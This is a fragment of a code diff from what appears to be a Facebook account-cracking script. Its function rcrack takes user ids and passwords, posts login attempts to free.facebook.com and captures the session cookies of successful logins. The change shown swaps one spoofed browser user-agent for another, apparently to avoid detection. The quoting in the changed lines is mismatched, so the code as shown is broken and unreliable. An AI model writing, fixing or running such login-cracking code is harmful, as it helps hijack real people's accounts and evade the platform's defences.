@@ -1881,7 +1881,7 @@ def rcrack(uid,pwx,tl):
              'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
-             'user-agent':'Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)
+             'user-agent':'Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5656.194 Safari/537.36 OPR/97.0.4300.82"}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
